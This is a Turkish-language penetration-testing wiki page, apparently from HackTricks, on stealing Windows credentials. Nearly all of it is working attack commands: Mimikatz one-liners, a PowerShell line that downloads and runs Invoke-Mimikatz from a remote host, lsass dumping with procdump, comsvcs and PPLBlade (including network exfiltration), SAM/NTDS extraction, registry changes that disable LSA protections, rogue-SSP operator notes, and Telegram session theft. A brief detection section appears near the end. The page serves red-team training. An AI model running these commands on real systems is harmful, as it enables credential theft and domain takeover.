# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz ile Kimlik Bilgileri

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulabilirsiniz.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **aracını** kullanın.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV Atlatma

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ten Procdump meşru bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmez.\
Bu aracı **lsass process'ini dump etmek**, **dump'ı indirmek** ve **dump'tan kimlik bilgilerini yerel olarak çıkarmak** için kullanabilirsiniz.

[SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

This işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** yazılımları, **lsass.exe'yi dump etmek için procdump.exe kullanılmasını** **zararlı** olarak **algılayabilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizgilerini **algılamalarıdır**. Bu nedenle, **lsass.exe adı yerine** procdump'a **argüman olarak** lsass.exe'nin **PID**'sini **vermek** daha **gizlidir**.

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **process belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argümanı kullanmak önemli değildir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni oluşturur ve üçüncü bileşen kesinlikle **full** sözcüğü olmalıdır. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra DLL, dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
**comsvcs.dll**, lsass process'ini dump etmek için kullanılabilir; böylece procdump'ı yükleyip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Çalıştırmak için aşağıdaki komut kullanılır:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bu süreci [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Görev Çubuğu'na sağ tıklayın ve Task Manager'a tıklayın.
2. More details'a tıklayın.
3. Processes sekmesinde "Local Security Authority Process" işlemini bulun.
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file"a tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir ikili dosyadır.

Önceden oluşturulmuş tam sistem çökme dökümü veya erişilebilir bir kullanıcı klasöründeki sıkıştırılmış kopyası, çevrimdışı analiz için kimlik bilgisi verilerini koruyor olabilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme için ipucudur: kaynağı ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade ile lsass dump etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske yazmadan uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın imza tabanlı tespit mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
3. Bellek dump'ını diske yazmadan RAW ve SMB upload yöntemleriyle yükleme (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump kullanmadan SSP tabanlı LSASS dökümü

Ink Dragon, `MiniDumpWriteDump` çağrısı yapmayan ve bu nedenle bu API üzerindeki EDR hook'larını hiç tetiklemeyen, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL'yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu, **LSASS**'ın kötü amaçlı DLL'yi yeni bir Security Support Provider (SSP) olarak yüklemesini sağlar.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her baytı `0x20` ile XOR işleminden geçirir ve yürütmeyi devretmeden önce kodu çözülmüş blob'u belleğe eşler.
3. **Aşama 3 dumper** – Eşlenen payload, hash'lenmiş API adlarından çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dump'ını dosyaya aktarır ve daha sonra exfiltration yapılabilmesi için handle'ı kapatır.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, sabit kodlanmış yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirdiğinden, dosyaları farklı konumlara koymak zinciri bozar.
* Kayıt işlemi, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle gerçekleşir. LSASS'ın SSP'yi her açılışta yeniden yüklemesini sağlamak için bu değeri kendiniz ekleyebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump'lardır. Dosyaları yerel olarak açın, ardından kimlik bilgilerini çıkarmak için Mimikatz/Volatility araçlarına verin.
* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe`'nin admin/SeTcb haklarıyla çalıştırılması gerekir; çağrı döndükten sonra LSASS, rogue SSP'yi şeffaf biçimde yükler ve Aşama 2'yi yürütür.
* DLL'yi diskten silmek, onu LSASS'tan kaldırmaz. Kayıt defteri girdisini silip LSASS'ı yeniden başlatın (reboot) veya uzun süreli persistence için bırakın.

## CrackMapExec

### SAM hash'lerini dökme

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA sırlarını dump etme

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Hedef DC'den NTDS.dit'i Dump et

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Hedef DC'den NTDS.dit parola geçmişini Dump et

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM ve SYSTEM'i Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korumalı oldukları için** onları normal bir şekilde kopyalayamazsınız.

### Registry'den

Bu dosyaları çalmanın en kolay yolu Registry'den bir kopya almaktır:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali makinenize and **extract the hashes** using:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bu hizmeti kullanarak korunan dosyaları kopyalayabilirsiniz. Administrator olmanız gerekir.

#### vssadmin kullanarak

vssadmin ikili dosyası yalnızca Windows Server sürümlerinde bulunur.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağına** dair bir örnektir (kullanılan sabit disk "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında önemli verileri barındırdığı için **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarının **parola hash**'leri bu dosyada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesnelerle ilgili ayrıntıları saklar.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **güvenlik tanımlayıcıları** burada tutulur ve depolanan nesnelerin güvenliğiyle erişim denetimini sağlar.

Christoffer Andersson'ın veritabanı katmanına ilişkin araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı biçimde belgeliyor.<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu DLL, _lsass.exe_ tarafından kullanılır. Ardından **NTDS.dit** dosyasının bir **bölümü** **`lsass`** belleğinde bulunabilir (önbellek kullanılarak performans artırıldığından, muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri çözme

Hash üç kez şifrelenmiştir:

1. Password Encryption Key (**PEK**) değerini **BOOTKEY** ve **RC4** kullanarak çözün.
2. **Hash**'i **PEK** ve **RC4** kullanarak çözün.
3. **Hash**'i **DES** kullanarak çözün.

**PEK**, her etki alanı denetleyicisinde **aynı değere** sahiptir; ancak bu değer, ilgili etki alanı denetleyicisinin **SYSTEM** hive'ındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde şifrelenmiştir. Bu nedenle kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

Ayrı bir [kernel handle-table redirection tekniği](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md), VSS kullanmadan önceden açılmış bir NTDS dosya nesnesini kopyalayabilir; ancak etki alanı denetleyicisinde keyfi kernel okuma/yazma primitive'i gerektirir.<sup>[[16]](#references)</sup>

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) yöntemini de kullanabilirsiniz. **SYSTEM file**'ın da bir kopyasına ihtiyacınız olacağını unutmayın (yine, [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) yöntemini kullanın).

### **NTDS.dit'ten hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Geçerli bir domain admin kullanıcısı kullanarak bunları **otomatik olarak da çıkarabilirsiniz**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**Büyük NTDS.dit dosyalarını** [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmanız önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.

### **NTDS.dit dosyasındaki domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Yalnızca sırlar değil, ham NTDS.dit dosyası zaten alınmışsa daha fazla bilgi çıkarmak için tüm nesneler ve öznitelikleri de çıkarılır.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive isteğe bağlıdır ancak secret'ların çözülmesini sağlar (NT ve LM hash'leri, cleartext parolalar, Kerberos veya trust key'leri gibi ek kimlik bilgileri, NT ve LM parola geçmişleri). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hash'leriyle birlikte kullanıcı ve makine hesapları, UAC flag'leri, son oturum açma ve parola değiştirme zaman damgaları, hesap açıklamaları, adları, UPN'leri, SPN'leri, gruplar ve özyinelemeli üyelikler, organizasyon birimi ağacı ve üyelikleri, trust türleri, yönleri ve öznitelikleriyle birlikte trusted domain'ler...

## Lazagne

Binary dosyasını [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.

```
lazagne.exe all
```

## SAM ve LSASS'ten kimlik bilgilerini çıkarmaya yönelik diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekteki kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM dosyasından kimlik bilgilerini çıkarma

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve **çalıştırın**; parolalar çıkarılır.

## Boşta kalan RDP oturumlarını inceleme ve güvenlik denetimlerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri tüm red-teamer’lar için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Gelen RDP bulguları** – Makineyi kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Olay Kimliklerini sorgulayın:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Bir Domain Admin'in düzenli olarak hangi bağlantıyı kurduğunu öğrendikten sonra, oturumu **bağlantısı kesilmiş** olsa da hâlâ mevcutken LSASS'ı (LalsDumper/Mimikatz ile) dökümleyin. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS'ta bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller'larda kalıcılık sağlanabilir.

### FinalDraft tarafından hedeflenen Registry düşürmeleri

Aynı implant, credential hırsızlığını kolaylaştırmak için çeşitli registry anahtarlarını da kurcalar:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1`, gelen RDP bağlantıları için Restricted Admin'ı devre dışı bırakır; bu mod üzerinden pass-the-hash kullanımını **etkinleştirmez**. Değeri `0` olarak ayarlamak hedefte Restricted Admin kullanımına izin verir, ancak istemci `/RestrictedAdmin` isteğinde bulunmalı veya Restricted Admin'ı zorunlu kılan bir ilke kullanmalıdır.<sup>[[14]](#references)</sup> Tek başına bir hash, uzaktan yönetici hakları vermez; bkz. [RDP kimlik doğrulama ön koşulları](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakarak yerel yöneticilerin ağ üzerinden kısıtlanmamış token'lar almasını sağlar.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin vererek saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sunar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi döküm araçlarının belleğe erişmesini kolaylaştırır.

## hMailServer yapılandırma kimlik bilgileri (ihlal sonrası)

Kurulum düzenine göre tam olarak şu yapılandırma dosyalarını kontrol edin: `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini`. Okunabilir ve boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parolası hash'idir; Windows Administrator parolasının kanıtı değildir. Bu kimlik bilgisi ele geçirilirse, herhangi bir Windows hesabına geçiş için parola tekrar kullanımının ve oturum açma haklarının ayrıca doğrulanması gerekir.

SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık word endianness takasları kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex dizgesini şu Python snippet'iyle kullanın:<sup>[[2]](#references)</sup>

Önce mevcut hesabın hem INI dosyasını hem de karşılık gelen SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında saklanan mailbox hesap hash'lerinden ayrıdır. Kullanımdaki bir veritabanını incelemek veya yükseltmek için canlı dosya yerine bir **kopyasını** kullanın.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Açık metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit sağlayıcıyı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat mode `1421`). Kırılmış bir posta kutusu parolası, yalnızca bu parola bir local/domain hesabında yeniden kullanılıyorsa ve bu hesap gerekli remote-logon haklarına sahipse Windows kullanıcısına pivot sağlar.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback’i `LsaApLogonUserEx2`'yi engelleyerek **plaintext logon passwords** yakalar. Amaç, kimlik bilgilerinin **logon sırasında** (hash’lenmeden önce) yakalanması, ardından diske yazılması veya operatöre döndürülmesi için authentication package callback’ini hook’lamak ya da sarmalamaktır. Bu genellikle LSA’ya enjekte olan veya LSA’ya kaydolan ve ardından kullanıcı adı, domain ve parolayla birlikte her başarılı etkileşimli/ağ logon olayını kaydeden bir yardımcı program olarak uygulanır.<sup>[[1]](#references)</sup>

Operasyonel notlar:
- Yardımcı programı authentication path’e yüklemek için local admin/SYSTEM yetkisi gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook’a bağlı olarak etkileşimli, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kaydedilmiş bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dumper araçları dosyayı ayrıştırıp kaydedilmiş SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell’lerde dosya genellikle Base64 olarak kodlanıp stdout’a yazdırılarak dışarı aktarılır.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Operatör tarafında, kimlik bilgilerini kurtarmak için dosyayı yeniden oluşturun ve dumper'ı yerel olarak çalıştırın:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol üzerinden tarayıcı oturumu ve çerez hırsızlığı

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` oturumu hırsızlığı

Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli kaldığı sürece hesap parolası olmadan kimlik doğrulamak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse oturumu çalan kişinin ayrıca erişim koduna da ihtiyacı vardır. Kimliği doğrulanmış bir oturum, kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>

### Keşif ve edinme

Hem kurulu hem de taşınabilir düzenleri arayın; Microsoft Store paket adları değişiklik gösterebilir. Bu nedenle `TelegramMessenge` içeren paket dizinlerini listeleyin ve bunların `LocalCache\Roaming` alt dizinini inceleyin.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Normal okuma işlemleri başarısız olursa ve process token'ında `SeBackupPrivilege` **zaten bulunuyor ve etkinse**, backup-aware erişim bir alternatif sunar; bu erişim ayrıcalığı edinmez veya process'i yükseltmez. Gerekli token ayrıcalıkları mevcut olduğunda `FILE_FLAG_BACKUP_SEMANTICS` ile `CreateFileW`, backup/restore semantiği isteyip dosya güvenlik denetimlerini geçersiz kılabilir; ancak bu flag tek başına uyumsuz bir paylaşım kilidini aşamaz.<sup>[[10]](#references)[[11]](#references)</sup>

Canlı ve kilitli dosyalar için bir **Volume Shadow Copy** oluşturun/okuyun; ACL'nin engellediği dosyalar için `robocopy /B`, backup mode kullanır ve dosya ile dizin ACL'lerini geçersiz kılar.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Bant genişliğini gözeten bir implant, önce yalnızca dosya yollarının envanterini gönderebilir, bir anlık görüntü tanımlayıcısı ve C2'de zaten depolanmış yolları alabilir, ardından yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` listelemesinden sonra yapılan küçük artımlı aktarımlar bile oturum hırsızlığının başarılı olduğunu gösterebilir.<sup>[[10]](#references)</sup>

### Tespit ve kontrol altına alma

Telegram dışı bir işlem tarafından `tdata` dizinine özyinelemeli erişimi; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiğiyle dosya açma işlemleri, VSS etkinliği veya `/B` kullanan bir alt `robocopy.exe` işlemiyle ilişkilendirin. Ayrıca `%APPDATA%` ve `%LOCALAPPDATA%\Packages` dizinlerinin hızla listelenmesini ve ardından aynı işlemden giden bağlantılar kurulmasını araştırın. Güvenlik ihlalinden sonra, tanımadığınız oturumları sonlandırmak için **Settings → Devices** (veya **Privacy & Security → Active Sessions**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, daha önce çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı

